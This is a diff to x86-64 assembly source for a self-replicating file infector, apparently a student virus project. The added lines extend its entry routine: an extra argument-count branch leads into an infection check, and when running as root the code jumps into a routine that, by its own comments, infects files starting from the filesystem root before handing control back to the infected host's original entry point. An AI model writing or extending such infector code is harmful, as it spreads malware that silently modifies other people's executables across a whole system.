@@ -16,11 +16,14 @@ section .text
 	global _read_dir
 	global _ft_strlen
 	global _verif
+	global _verify_o_entry
+    global _continue_normaly
 	extern _treat_file
 	extern _final_end
 	extern _thread_create
 	extern _start_infect
 	extern _infect_from_root
+    extern _verify_starting_infect
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -51,12 +54,37 @@ _start:
 	push r13 ; +88
 	push r14 ; +96
 	push r15 ; +104
+
+;;;;;;;;;;;;;;;;;;;;;;
+;   NULL (8 bytes)   ;
+;--------------------;
+;   env[n]           ;
+;   ...              ;
+;   env[0]           ;
+;--------------------;
+;   NULL (8 bytes)   ;
+;--------------------;
+;   argv[n]          ;
+;       ...          ;
+;   argv[0]          ;
+;--------------------;
+;   argc (8 bytes)   ;
+;--------------------;
+;   rsp at start     ;
+
+    ; argc = rsp + 128 if on stack or rsp + 64 if on registers
+    ; argv = rsp + 136 if on stack (it's argv[0], then argv[1] etc...),
+    ;   and rsp + 72 by registers (rsi), it's argv, we need to dereference
+    ; env = rsp + 128 + argc + 8(NULL addr), list of env on stack
+    ;   or rdx on registers
 ;;;;;;;;;;;;;;;;;;;;;
 ; To know if we need to execute the binary code, we pass a code in parameter.
 ; So we need to check parameters to know what to do
 ; Arguments can be on stack or on registers, depending of the compilator so:
 	cmp QWORD [rsp + 128], 3 ; check if argc on the stack is equal 3
 	je _alternative_start
+	cmp QWORD [rsp + 128], 4 ; check if argc on the stack is equal 3
+	je _verify_starting_infect
 _check_registers:
 	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
 	je _alternative_start_by_registers
@@ -77,7 +105,8 @@ _test_root_infect:
 	syscall ; We call geteuid
 	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
 	jne _continue_normaly
-    call _infect_from_root
+    lea rdi, [rel _force_exit]
+    jmp _infect_from_root
 
 ; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
 ; software with a too long execution.
@@ -122,6 +151,7 @@ _jmp_end:
 	pop rdi
 	pop rdi
 	pop rdi
+_verify_o_entry:
 	lea rax, [rel _o_entry] ; mov in rax the o_entry address
 	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
 	jne _jmp_to_o_entry
